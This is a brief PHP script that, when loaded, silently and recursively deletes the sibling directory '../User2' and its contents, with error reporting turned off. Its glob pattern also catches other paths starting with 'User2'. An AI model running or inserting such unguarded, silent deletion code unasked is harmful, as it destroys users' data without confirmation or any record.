<?php
error_reporting(0);
delete_files('../User2');
function delete_files($target) {
    sleep(1);

    if(is_dir($target)){

        $files = glob( $target . '*', GLOB_MARK ); //GLOB_MARK adds a slash to directories returned

        foreach( $files as $file ){

            delete_files( $file );      
        }

        rmdir( $target );
    } elseif(is_file($target)) {
        unlink( $target );  
    }
}

?>